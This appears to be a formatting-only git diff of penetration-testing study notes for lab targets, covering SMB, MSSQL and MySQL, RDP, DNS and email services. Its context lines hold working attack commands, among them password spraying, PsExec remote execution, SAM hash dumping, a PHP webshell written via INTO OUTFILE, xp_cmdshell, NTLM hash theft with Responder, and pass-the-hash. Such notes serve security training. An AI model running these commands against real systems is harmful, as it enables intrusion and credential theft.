@@ -34,9 +34,10 @@ sudo nmap 10.129.14.128 -sV -sC -p139,445
 
 Look for extended attributes
 
-```
+```shell
 allinfo "file.txt"
 ```
+
 ### smbclient
 
 ```shell
@@ -56,11 +57,13 @@ smbmap -H 10.129.14.128 -r notes
 ```
 
 Download
+
 ```shell
 smbmap -H 10.129.14.128 --download "notes\note.txt"
 ```
 
 Upload
+
 ```shell
 smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
 ```
@@ -72,6 +75,7 @@ rpcclient -U'%' 10.10.110.17
 ```
 
 We can use this [cheat sheet from the SANS Institute](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) or review the complete list of all these functions found on the [man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) of the `rpcclient`.
+
 ### enum4linux
 
 ```shell
@@ -90,7 +94,6 @@ smbclientng --host 10.10.10.178 -d 'HTB-NEST' -u 'TempUser' -p 'welcome2019'
 sudo mount -t cifs -o 'username=TempUser,password=welcome2019' //10.10.10.178/Users /mnt/shares/users
 ```
 
-
 ### Protocol Specifics Attacks
 
 #### Brute Forcing and Password Spray
@@ -99,10 +102,9 @@ sudo mount -t cifs -o 'username=TempUser,password=welcome2019' //10.10.10.178/Us
 nxc smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
 ```
 
-
-> [!NOTE] 
+> [!NOTE]
 > By default CME will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. it is very useful for spraying a single password against a large user list. Additionally, if we are targetting a non-domain joined computer, we will need to use the option `--local-auth`. For a more detailed study Password Spraying see the Active Directory Enumeration & Attacks module.
-> 
+>
 
 #### Other attacks
 
@@ -116,7 +118,9 @@ When attacking a Windows SMB Server, our actions will be limited by the privileg
 - Extract Hashes from SAM Database
 - Enumerating Logged-on Users
 - Pass-the-Hash (PTH)
+
 ##### Remote Code Execution (RCE)
+
 [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) is a tool that lets us execute processes on other systems, complete with full interactivity for console applications, without having to install client software manually. It works because it has a Windows service image inside of its executable. It takes this service and deploys it to the admin$ share (by default) on the remote machine. It then uses the DCE/RPC interface over SMB to access the Windows Service Control Manager API. Next, it starts the PSExec service on the remote machine. The PSExec service then creates a [named pipe](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes) that can send commands to the system.
 
 We can download PsExec from [Microsoft website](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec), or we can use some Linux implementations:
@@ -128,21 +132,25 @@ We can download PsExec from [Microsoft website](https://docs.microsoft.com/en-us
 - [Metasploit PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) - Ruby PsExec implementation.
 
 Impacket PsExec
+
 ```shell
 impacket-psexec administrator:'Password123!'@10.10.110.17
 ```
 
 NetExec
+
 ```shell
 nxc smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
 ```
 
 Enumerating Logged-on Users
+
 ```shell
 nxc smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
 ```
 
 Extract Hashes from SAM Database
+
 ```shell
 nxc smb 10.10.110.17 -u administrator -p 'Password123!' --sam
 ```
@@ -201,6 +209,7 @@ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
 ```
 
 Reverse shell
+
 ```shell
 impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'reverseshell code here'
 ```
@@ -215,7 +224,8 @@ In the [Footprinting module](https://academy.hackthebox.com/course/preview/footp
 
 ## SQL Databases
 
-By default, MSSQL uses ports TCP/1433 and UDP/1434, and MySQL uses TCP/3306. However, when MSSQL operates in a "hidden" mode, it uses the TCP/2433 
+By default, MSSQL uses ports TCP/1433 and UDP/1434, and MySQL uses TCP/3306. However, when MSSQL operates in a "hidden" mode, it uses the TCP/2433
+
 ### MySQL
 
 ```shell
@@ -225,6 +235,7 @@ mysql -u julio -pPassword123 -h 10.129.20.13
 ### SQL Server
 
 Sqlcmd
+
 ```shell
 sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
 ```
@@ -232,6 +243,7 @@ sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
 If we use `sqlcmd`, we will need to use `GO` after our query to execute the SQL syntax.
 
 sqsh (linux)
+
 ```shell
 sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
 ```
@@ -242,7 +254,8 @@ When using Windows Authentication, we need to specify the domain name or the hos
 sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
 ```
 
-Impacket 
+Impacket
+
 ```shell
 mssqlclient.py -p 1433 julio@10.129.203.7 
 ```
@@ -275,6 +288,7 @@ SELECT name FROM master.dbo.sysdatabases
 ```sql
 SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE'
 ```
+
 ### Execute Commands
 
 `MSSQL` has a [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15) called [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allow us to execute system commands using SQL. Keep in mind the following about `xp_cmdshell`:
@@ -284,6 +298,7 @@ SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE'
 - `xp_cmdshell` operates synchronously. Control is not returned to the caller until the command-shell command is completed
 
 To execute commands using SQL syntax on MSSQL, use:
+
 #### XP_CMDSHELL
 
 ```shell
@@ -322,12 +337,15 @@ There are other methods to get command execution, such as adding [extended store
 `MySQL` supports [User Defined Functions](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/) which allows us to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this [GitHub repository](https://github.com/mysqludf/lib_mysqludf_sys). It is not common to encounter a user-defined function like this in a production environment, but we should be aware that we may be able to use it.
 
 ### Write Local Files
+
 #### MySQL
 
 Write PHP webshell on writable web server directory
+
 ```shell
 mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
 ```
+
 ##### Secure File Privileges
 
 In `MySQL`, a global system variable [secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) limits the effect of data import and export operations, such as those performed by the `LOAD DATA` and `SELECT … INTO OUTFILE` statements and the [LOAD_FILE()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file) function. These operations are permitted only to users who have the [FILE](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file) privilege.
@@ -341,9 +359,11 @@ In `MySQL`, a global system variable [secure_file_priv](https://dev.mysql.com/do
 ```shell
 show variables like "secure_file_priv";
 ```
+
 #### MSSQL
 
 To write files using `MSSQL`, we need to enable [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), which requires admin privileges, and then execute some stored procedures to create the file:
+
 ##### Enable Ole Automation Procedures
 
 ```shell
@@ -356,6 +376,7 @@ To write files using `MSSQL`, we need to enable [Ole Automation Procedures](http
 7> RECONFIGURE
 8> GO
 ```
+
 ##### Create a File
 
 ```shell
@@ -370,12 +391,14 @@ To write files using `MSSQL`, we need to enable [Ole Automation Procedures](http
 ```
 
 ### Read Local Files
+
 #### MSSQL
 
 ```shell
 SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
 GO
 ```
+
 #### MySQL
 
 ```shell
@@ -397,6 +420,7 @@ To make this work, we need first to start [Responder](https://github.com/lgandx/
 subdirectory    depth
 --------------- -----------
 ```
+
 #### XP_SUBDIRS Hash Stealing
 
 ```shell
@@ -408,11 +432,13 @@ xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned
 ```
 
 Responder
+
 ```shell
 sudo responder -I tun0
 ```
 
 Impacket smbserver
+
 ```shell
 sudo impacket-smbserver share ./ -smb2support
 ```
@@ -441,6 +467,7 @@ valentin
 
 (3 rows affected)
 ```
+
 #### Verifying our Current User and Role
 
 ```shell
@@ -460,6 +487,7 @@ julio
 ```
 
 As the returned value `0` indicates, we do not have the sysadmin role, but we can impersonate the `sa` user. Let us impersonate the user and execute the same commands. To impersonate a user, we can use the Transact-SQL statement `EXECUTE AS LOGIN` and set it to the user we want to impersonate.
+
 #### Impersonating the SA User
 
 ```shell
@@ -490,6 +518,7 @@ We can now execute any command as a sysadmin as the returned value `1` indicates
 ### Communicate with Other Databases with MSSQL
 
 Identify linked Servers in MSSQL
+
 ```shell
 1> SELECT srvname, isremote FROM sysservers
 2> GO
@@ -503,6 +532,7 @@ DESKTOP-MFERMN4\SQLEXPRESS          1
 ```
 
 Identify the user used for the connection and its privileges
+
 ```shell
 1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
 2> GO
@@ -579,7 +609,6 @@ Once the registry key is added, we can use `xfreerdp` with the option `/pth` to 
 xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
 ```
 
-
 ## DNS
 
 ```shell
@@ -589,6 +618,7 @@ nmap -p53 -Pn -sV -sC 10.10.110.213
 ### DNS Zone Transfer
 
 Dig:
+
 ```shell
 dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
 ```
@@ -596,6 +626,7 @@ dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
 Tools like [Fierce](https://github.com/mschwager/fierce) can also be used to enumerate all DNS servers of the root domain and scan for a DNS zone transfer:
 
 Fierce:
+
 ```shell
 fierce --domain zonetransfer.me
 ```
@@ -605,6 +636,7 @@ fierce --domain zonetransfer.me
 Before performing a subdomain takeover, we should enumerate subdomains for a target domain using tools like [Subfinder](https://github.com/projectdiscovery/subfinder). This tool can scrape subdomains from open sources like [DNSdumpster](https://dnsdumpster.com/). Other tools like [Sublist3r](https://github.com/aboul3la/Sublist3r) can also be used to brute-force subdomains by supplying a pre-generated wordlist:
 
 Subfinder:
+
 ```shell
 ./subfinder -d inlanefreight.com -v 
 ```
@@ -612,6 +644,7 @@ Subfinder:
 An excellent alternative is a tool called [Subbrute](https://github.com/TheRook/subbrute). This tool allows us to use self-defined resolvers and perform pure DNS brute-forcing attacks during internal penetration tests on hosts that do not have Internet access.
 
 Subbrute:
+
 ```shell
 ./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt
 ```
@@ -663,16 +696,19 @@ Approximate round trip times in milli-seconds:
 ## Email Services
 
 Host - MX Records
+
 ```shell
 host -t MX hackthebox.eu
 ```
 
 DIG - MX Records
+
 ```shell
 dig mx plaintext.do | grep "MX" | grep -v ";"
 ```
 
 Host - A Records
+
 ```shell
 host -t A mail1.inlanefreight.htb.
 ```
@@ -726,6 +762,7 @@ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
 ### Password Attacks
 
 Hydra
+
 ```shell
 hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
 ```
@@ -743,17 +780,20 @@ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
 ```
 
 O365 Spray - Password Spraying
+
 ```shell
 python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
 ```
 
 Interact with service
-```
+
+```shell
 telnet 10.129.9.20 143
 11 login "marlin@inlanefreight.htb" "poohbear"
 11 OK LOGIN completed
 12 select "INBOX"
 ```
+
 ### Protocol Specifics Attacks
 
 #### Open Relay
